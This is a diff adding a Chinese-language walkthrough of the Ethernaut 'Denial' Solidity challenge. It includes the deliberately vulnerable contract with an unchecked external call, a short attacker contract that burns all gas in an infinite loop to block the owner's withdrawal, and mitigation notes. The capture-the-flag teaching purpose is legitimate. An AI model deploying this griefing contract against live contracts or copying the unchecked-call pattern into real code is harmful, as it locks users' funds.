@@ -1524,3 +1524,57 @@ contract AlienCodex is Ownable {
 - [Inheritance](https://docs.soliditylang.org/en/v0.5.0/contracts.html#inheritance)
 - [Layout of State Variables in Storage](https://docs.soliditylang.org/en/v0.8.14/internals/layout_in_storage.html)
 - [Accessing Private Data | Solidity by Example](https://solidity-by-example.org/hacks/accessing-private-data/)
+
+## 20. Denial
+
+阻止 `owner` 在投资人调用 `withdraw()` 时获利
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+contract Denial {
+
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    address public constant owner = address(0xA9E);
+    uint timeLastWithdrawn;
+    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
+
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
+    }
+
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint amountToSend = address(this).balance / 100;
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call{value:amountToSend}("");
+        payable(owner).transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] +=  amountToSend;
+    }
+
+    // allow deposit of funds
+    receive() external payable {}
+
+    // convenience function
+    function contractBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+```
+
+- `withdraw()` 并没有检查 `partner.call{value:amountToSend}("");` 的返回值，因此被调用函数 `revert` 并不会影响后续语句的执行，但可以耗尽汽油使整个交易失败
+
+    ```js
+    // 先使用 setWithdrawPartner 设置 partner 为合约 Hack 的地址
+    contract Hack {
+      receive() external payable {
+        while(true) {}
+      }
+    }
+    ```
+
+- 当使用 `call` 发起外部调用时，最好指定汽油量，如 `call.gas(100000).value()`
+- 外部 `CALL` 最多可以使用 `CALL` 时 63/64 的汽油，因此，足够高的汽油量也可以缓解这种攻击
